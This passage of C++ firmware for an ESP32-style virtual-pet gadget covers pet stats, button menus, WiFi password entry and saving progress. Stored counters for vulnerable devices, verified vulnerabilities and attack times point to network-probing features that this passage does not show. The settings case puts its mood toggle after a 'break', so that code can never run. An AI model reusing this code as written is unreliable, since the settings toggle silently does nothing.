    if (animFrame % 2 == 0) {
      for (int i = 0; i < 2; i++) {
        int steamX = x - 8 + random(0, 16);
        int steamY = y - 15 - random(0, 5);
        display.drawPixel(steamX, steamY, SSD1306_WHITE);
      }
    }
  }
}

void updatePetStats() {
  unsigned long now = millis();
  pet.lastUpdate = now;
  
  if (pet.stage > 0) {
    pet.hunger -= 5;
    pet.happiness -= 3;
    pet.energy -= 2;
    
    if (pet.hunger < 20) pet.happiness -= 2;
    
    pet.hunger = constrain(pet.hunger, 0, 100);
    pet.happiness = constrain(pet.happiness, 0, 100);
    pet.energy = constrain(pet.energy, 0, 100);
  }
  
  pet.age++;
}

void checkEvolution() {
  if (pet.stage < 7 && pet.xp >= XP_THRESHOLDS[pet.stage + 1]) {
    pet.stage++;
    
    display.clearDisplay();
    display.setTextSize(2);
    display.setCursor(10, 20);
    display.print(F("LEVEL UP!"));
    display.setTextSize(1);
    display.setCursor(20, 40);
    display.print(STAGE_NAMES[pet.stage]);
    display.display();
    
    beep(4);
    delay(2000);
    saveProgress();
  }
}

void addXP(int amount) {
  pet.xp += amount;
  checkEvolution();
}

void handleButtons() {
  static unsigned long lastPress = 0;
  unsigned long now = millis();
  
  if (now - lastPress < 200) return;
  
  bool upPressed = (digitalRead(BTN_UP) == LOW);
  bool downPressed = (digitalRead(BTN_DOWN) == LOW);
  bool okPressed = (digitalRead(BTN_OK) == LOW);
  bool menuPressed = (digitalRead(BTN_MENU) == LOW);
  
  if (!upPressed && !downPressed && !okPressed && !menuPressed) return;
  
  lastPress = now;
  
  if (upPressed && downPressed) {
    saveProgress();
    showMessage("SAVED!", 1000);
    beep(2);
    return;
  }
  
  if (okPressed && menuPressed) {
    if (currentState == STATE_PET && !wifiScanning && !networkScanning && !bleScanning) {
      nextBLEScan = 0;
      showMessage("Force BLE Scan!", 1000);
      beep(1);
    }
    return;
  }
  
  switch (currentState) {
    case STATE_PET:
      if (menuPressed) {
        currentState = STATE_MENU;
        menuSelection = 0;
      } else if (upPressed) {
        pet.hunger += 10;
        pet.hunger = constrain(pet.hunger, 0, 100);
        currentAction = ACTION_EATING;
        actionUntil = now + 1000;
        beep(1);
      } else if (downPressed) {
        pet.happiness += 5;
        pet.happiness = constrain(pet.happiness, 0, 100);
        currentAction = ACTION_HAPPY;
        actionUntil = now + 1000;
        beep(1);
      } else if (okPressed) {
        currentAction = ACTION_JUMPING;
        actionUntil = now + 800;
        beep(1);
      }
      break;
      
    case STATE_MENU:
      if (upPressed && menuSelection > 0) {
        menuSelection--;
      } else if (downPressed && menuSelection < 5) {
        menuSelection++;
      } else if (okPressed) {
        switch (menuSelection) {
          case 0: currentState = STATE_STATS; break;
          case 1: currentState = STATE_HISTORY; historyScroll = 0; break;
          case 2: currentState = STATE_WIFI_SETUP; wifiSetupScroll = 0; break;
          case 3: currentState = STATE_SETTINGS; break;
          case 4: saveProgress(); break;
          case 5: currentState = STATE_PET; break;
        }
      } else if (menuPressed) {
        currentState = STATE_PET;
      }
      break;
      
    case STATE_STATS:
      if (upPressed && currentStatsTab > 0) {
        currentStatsTab = (StatsTab)(currentStatsTab - 1);
        beep(1);
      } else if (downPressed && currentStatsTab < TAB_COUNT - 1) {
        currentStatsTab = (StatsTab)(currentStatsTab + 1);
        beep(1);
      } else if (menuPressed) {
        currentState = STATE_MENU;
      }
      break;
    case STATE_SETTINGS:
      if (menuPressed) currentState = STATE_MENU;
      break;
      if (okPressed) {
        // Toggle mood system
        settings.moodEnabled = !settings.moodEnabled;
        prefs.putBool("moodEn", settings.moodEnabled);
        beep(1);
      }
      
    case STATE_HISTORY:
      if (upPressed && historyScroll > 0) {
        historyScroll--;
      } else if (downPressed && historyScroll < historyCount - 1) {
        historyScroll++;
      } else if (menuPressed) {
        currentState = STATE_MENU;
      }
      break;
      
    case STATE_BLE_RESULTS:
      if (okPressed || menuPressed) {
        currentState = STATE_PET;
      }
      break;
      
    case STATE_WIFI_SETUP:
      if (menuPressed) {
        currentState = STATE_MENU;
      } else if (okPressed) {
        startWiFiScanForSelector();
      } else if (upPressed) {
        if (wifiSetupPage == 1) {
          wifiSetupPage = 0;  // balik ke halaman info
        } else if (wifiCreds.hasSaved) {
          // Clear WiFi (seperti sebelumnya)
          showMessage("WiFi Cleared", 1500);
          wifiCreds.hasSaved = false;
          wifiCreds.ssid[0] = '\0';
          wifiCreds.password[0] = '\0';
          prefs.putBool("wifiSaved", false);
          prefs.remove("wifiSSID");
          prefs.remove("wifiPass");
          beep(1);
        }
      } else if (downPressed) {
        if (wifiSetupPage == 0) {
          wifiSetupPage = 1;  // pindah ke halaman instruksi
        }
        else if(wifiSetupPage == 1){
          wifiSetupPage = 0;
        }
      }
      break;
      
    case STATE_WIFI_SELECTOR:
      if (upPressed) {
        if (wifiSelectorIndex > 0) {
          wifiSelectorIndex--;
          if (wifiSelectorIndex < wifiSelectorScroll) {
            wifiSelectorScroll = wifiSelectorIndex;
          }
        }
      } else if (downPressed) {
        if (wifiSelectorIndex < wifiNetworkCount - 1) {
          wifiSelectorIndex++;
          if (wifiSelectorIndex >= wifiSelectorScroll + 3) {
            wifiSelectorScroll = wifiSelectorIndex - 2;
          }
        }
      } else if (okPressed) {
        if (wifiNetworks[wifiSelectorIndex].isOpen) {
          passwordLen = 0;
          memset(passwordBuffer, 0, 64);
          connectToSelectedWiFi();
        } else {
          passwordLen = 0;
          memset(passwordBuffer, 0, 64);
          keyboardX = 0;
          keyboardY = 0;
          currentState = STATE_WIFI_PASSWORD;
        }
      } else if (menuPressed) {
        currentState = STATE_WIFI_SETUP;
      }
      break;
      
    case STATE_WIFI_PASSWORD:
      if (upPressed) {
        if (keyboardY > 0) keyboardY--;
        else if (keyboardX > 0) keyboardX--;
      } else if (downPressed) {
        if (keyboardY < KEYBOARD_ROWS - 1) keyboardY++;
        else if (keyboardX < KEYBOARD_COLS - 1) keyboardX++;
      } else if (okPressed) {
        int charIdx = keyboardY * KEYBOARD_COLS + keyboardX;
        if (charIdx >= 0 && charIdx < (int)strlen(KEYBOARD_CHARS)) {
          if (passwordLen < 63) {
            passwordBuffer[passwordLen] = KEYBOARD_CHARS[charIdx];
            passwordLen++;
            beep(1);
          }
        }
      } else if (menuPressed) {
        if (passwordLen > 0) {
          passwordLen--;
          passwordBuffer[passwordLen] = '\0';
          beep(1);
        } else {
          connectToSelectedWiFi();
        }
      }
      break;
      
    case STATE_WIFI_CONNECTING:
      break;
  }
}

void saveProgress() {
  prefs.putInt("stage", pet.stage);
  prefs.putInt("xp", pet.xp);
  prefs.putInt("hunger", pet.hunger);
  prefs.putInt("happiness", pet.happiness);
  prefs.putInt("energy", pet.energy);
  prefs.putInt("age", pet.age);
  prefs.putInt("weight", pet.weight);
  prefs.putInt("totalNets", pet.totalNetworks);
  prefs.putInt("totalDevs", pet.totalDevices);
  prefs.putInt("rareDevs", pet.rareDevices);
  prefs.putInt("totalBLE", pet.totalBLEDevices);
  prefs.putInt("vulnDevs", pet.vulnerableDevices);
  prefs.putInt("critFinds", pet.criticalFinds);
  prefs.putInt("verifiedV", pet.verifiedVulns);
  // TAMBAH INI:
  prefs.putInt("mood", pet.mood);
  prefs.putInt("aggression", pet.aggressionLevel);
  
  pet.lastSave = millis();
}

bool loadProgress() {
  if (!prefs.isKey("stage")) return false;
  
  pet.stage = prefs.getInt("stage", 0);
  pet.xp = prefs.getInt("xp", 0);
  pet.hunger = prefs.getInt("hunger", 50);
  pet.happiness = prefs.getInt("happiness", 80);
  pet.energy = prefs.getInt("energy", 100);
  pet.age = prefs.getInt("age", 0);
  pet.weight = prefs.getInt("weight", 5);
  pet.totalNetworks = prefs.getInt("totalNets", 0);
  pet.totalDevices = prefs.getInt("totalDevs", 0);
  pet.rareDevices = prefs.getInt("rareDevs", 0);
  pet.totalBLEDevices = prefs.getInt("totalBLE", 0);
  pet.vulnerableDevices = prefs.getInt("vulnDevs", 0);
  pet.criticalFinds = prefs.getInt("critFinds", 0);
  pet.verifiedVulns = prefs.getInt("verifiedV", 0);
  // TAMBAH INI:
  pet.mood = prefs.getInt("mood", 50);
  pet.aggressionLevel = prefs.getInt("aggression", 0);
  pet.lastMoodUpdate = millis();
  pet.lastAttackTime = 0;
  pet.isAngry = false;
  
  pet.lastFeed = millis();
  pet.lastUpdate = millis();
  pet.lastSave = millis();
  
  return true;
}

void beep(int pattern) {
  if (!settings.beepEnabled) return;
  
  switch (pattern) {
    case 1:
      tone(BUZZER_PIN, 1000, 100);
      break;
    case 2:
      tone(BUZZER_PIN, 1200, 100);
      delay(150);
      tone(BUZZER_PIN, 1200, 100);
      break;
    case 3:
      tone(BUZZER_PIN, 1500, 100);
      delay(120);
      tone(BUZZER_PIN, 1500, 100);
      delay(120);
      tone(BUZZER_PIN, 1500, 100);
      break;
    case 4:
      tone(BUZZER_PIN, 1000, 100);
      delay(120);
      tone(BUZZER_PIN, 1200, 100);
      delay(120);
      tone(BUZZER_PIN, 1500, 150);
      break;
    case 5:
      tone(BUZZER_PIN, 500, 200);
      delay(250);
      tone(BUZZER_PIN, 400, 200);
      break;
  }
}
